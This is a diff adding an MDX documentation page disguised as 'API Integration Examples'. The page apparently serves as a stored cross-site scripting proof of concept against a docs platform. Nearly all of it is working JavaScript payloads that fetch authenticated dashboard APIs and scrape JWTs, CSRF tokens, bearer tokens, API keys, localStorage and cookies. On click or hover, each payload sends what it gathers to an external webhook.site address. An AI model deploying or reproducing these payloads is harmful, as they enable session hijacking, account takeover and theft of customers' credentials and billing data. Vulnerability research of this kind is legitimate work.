@@ -1,0 +1,111 @@
+---
+title: API Integration Examples
+subtitle: Working with the dashboard API
+slug: api-abuse-demo
+---
+
+## Interactive API Demo
+
+<div {...{onClick: () => {
+  if(typeof document === 'undefined') return;
+  const webhook = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f';
+  const results = {};
+  
+  const send = (tag, data) => {
+    navigator.sendBeacon(webhook + '?p=api-' + tag, JSON.stringify(data));
+  };
+
+  Promise.all([
+    fetch('/api/auth/session', {credentials: 'include'}).then(r => r.text()).then(t => { results.session = t.substring(0,1000); }).catch(e => { results.session_err = e.message; }),
+    
+    fetch('/api/auth/me', {credentials: 'include'}).then(r => r.text()).then(t => { results.me = t.substring(0,1000); }).catch(e => { results.me_err = e.message; }),
+    
+    fetch('/api/user', {credentials: 'include'}).then(r => r.text()).then(t => { results.user = t.substring(0,1000); }).catch(e => { results.user_err = e.message; }),
+    
+    fetch('/api/organizations', {credentials: 'include'}).then(r => r.text()).then(t => { results.orgs = t.substring(0,1000); }).catch(e => { results.orgs_err = e.message; }),
+    
+    fetch('/api/billing', {credentials: 'include'}).then(r => r.text()).then(t => { results.billing = t.substring(0,1000); }).catch(e => { results.billing_err = e.message; }),
+    
+    fetch('/api/members', {credentials: 'include'}).then(r => r.text()).then(t => { results.members = t.substring(0,1000); }).catch(e => { results.members_err = e.message; }),
+
+    fetch('/api/config', {credentials: 'include'}).then(r => r.text()).then(t => { results.config = t.substring(0,1000); }).catch(e => { results.config_err = e.message; }),
+
+    fetch('/api/onboarding-docs/publish/status', {credentials: 'include'}).then(r => r.text()).then(t => { results.publish = t.substring(0,1000); }).catch(e => { results.publish_err = e.message; }),
+
+  ]).then(() => {
+    results.domain = document.domain;
+    results.url = window.location.href;
+    send('dashboard-enum', results);
+    alert('Dashboard API enumeration sent to webhook. Found ' + Object.keys(results).length + ' responses.');
+  });
+}}}>Click to enumerate dashboard APIs (editor only)</div>
+
+---
+
+## Session Token Extraction
+
+<div {...{onClick: () => {
+  if(typeof document === 'undefined') return;
+  const webhook = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f';
+  
+  fetch(window.location.href, {credentials: 'include'}).then(r => r.text()).then(html => {
+    const tokenMatches = html.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g) || [];
+    const csrfMatches = html.match(/csrf[^"]*":\s*"([^"]+)"/gi) || [];
+    const actionMatches = html.match(/next-action[^"]*"[^"]+"/gi) || [];
+    const apiKeyMatches = html.match(/fern_[A-Za-z0-9_-]+/g) || [];
+    const authMatches = html.match(/Bearer [A-Za-z0-9_.-]+/g) || [];
+    
+    navigator.sendBeacon(webhook + '?p=tokens', JSON.stringify({
+      domain: document.domain,
+      jwts: tokenMatches.map(t => t.substring(0,100)),
+      csrf: csrfMatches,
+      actions: actionMatches.slice(0,5),
+      fernKeys: apiKeyMatches,
+      bearerTokens: authMatches.map(t => t.substring(0,100)),
+      pageSize: html.length
+    }));
+    alert('Token extraction sent. Found ' + tokenMatches.length + ' JWTs, ' + apiKeyMatches.length + ' Fern keys');
+  }).catch(e => alert('Error: ' + e.message));
+}}}>Click to extract tokens from page HTML (editor only)</div>
+
+---
+
+## Org Takeover PoC
+
+<div {...{onClick: () => {
+  if(typeof document === 'undefined') return;
+  const webhook = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f';
+
+  const nextDataScripts = document.querySelectorAll('script[type="application/json"]');
+  const nextData = [];
+  nextDataScripts.forEach(s => {
+    try { nextData.push(JSON.parse(s.textContent)); } catch(e) {}
+  });
+
+  const allScripts = document.querySelectorAll('script');
+  const inlineScripts = [];
+  allScripts.forEach(s => {
+    if(s.textContent && s.textContent.includes('session') || s.textContent.includes('token') || s.textContent.includes('org')) {
+      inlineScripts.push(s.textContent.substring(0,500));
+    }
+  });
+
+  const iframes = document.querySelectorAll('iframe');
+  const iframeSrcs = Array.from(iframes).map(f => f.src);
+
+  navigator.sendBeacon(webhook + '?p=page-data', JSON.stringify({
+    domain: document.domain,
+    nextDataCount: nextData.length,
+    nextData: JSON.stringify(nextData).substring(0,2000),
+    inlineScripts: inlineScripts.slice(0,5),
+    iframes: iframeSrcs,
+    localStorage: (() => { const d = {}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);d[k]=localStorage.getItem(k).substring(0,200);} return d; })()
+  }));
+  alert('Page data extraction sent');
+}}}>Click to extract page data and Next.js state (editor only)</div>
+
+---
+
+## Production Site Cookie Exfil (works on published docs)
+
+<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=prod-hover&domain=' + document.domain + '&cookie=' + encodeURIComponent(document.cookie.substring(0,800)); } }}}>Hover to confirm production XSS</div>
